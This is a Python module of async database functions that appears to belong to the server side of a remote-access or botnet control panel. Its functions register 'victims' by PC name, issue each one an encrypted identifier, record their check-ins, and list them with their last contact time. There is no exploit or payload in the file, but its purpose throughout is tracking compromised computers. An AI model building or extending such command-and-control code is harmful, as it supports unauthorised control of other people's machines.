from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession
from ..models import *

from ..CONFIG import key
from cryptography.fernet import Fernet

import time
import datetime


fernet = Fernet(key)


async def register_victim(session: AsyncSession, pc_name: str):
    new_victim = Victim(pc_name=pc_name, last_login_date=datetime.datetime.now(),
                        last_login_time=time.time())
    session.add(new_victim)
    await session.commit()
    enctex = fernet.encrypt(str(new_victim.id).encode())
    new_victim.unique_number = enctex
    session.add(new_victim)
    await session.commit()
    return new_victim


async def get_victim_id(session: AsyncSession, victim_id: int):
    victim = await session.execute(select(Victim).where(Victim.id == victim_id))
    return victim.scalars().first()


async def get_victim_unique_number(session: AsyncSession, unique_number: str):
    victim = await session.execute(select(Victim).where(Victim.unique_number == unique_number))
    # print(type(victim))
    # print(victim.scalars().all())
    return victim.scalars().first()


# async def get_active_victims(session: AsyncSession):
#     time_now = time.time() - 15 * 60
#     victims = await session.execute(select(Victim).where(Victim.last_login_time > time_now))
    # return victims.scalars().all()

async def get_users(session: AsyncSession):
    victims = await session.execute(select(Victim))
    # print("\n\n\n")
    lst = victims.scalars().fetchall()
    # print(lst)
    # print(lst[0])
    lst = [{
        "id": element.id,
        "pc_name": element.pc_name,
        "last_login_time": element.last_login_time  # костыль
            }
           for element in lst]
    # print("\n\n\n")
    return lst


async def set_login_data(session: AsyncSession, victim_id: int):
    victim = await get_victim_id(session, victim_id)
    victim.last_login_date = datetime.datetime.now()
    victim.last_login_time = time.time()
    await session.commit()
    return victim


async def login_victim(session: AsyncSession, unique_number: str):
    unique_number = (unique_number[3:])[:-2]
    victim_id = fernet.decrypt(unique_number.encode())
    victim = await get_victim_id(session=session, victim_id=int(victim_id.decode("utf-8")))
    victim.last_login_date = datetime.datetime.now()
    victim.last_login_time = time.time()
    await session.commit()
    return victim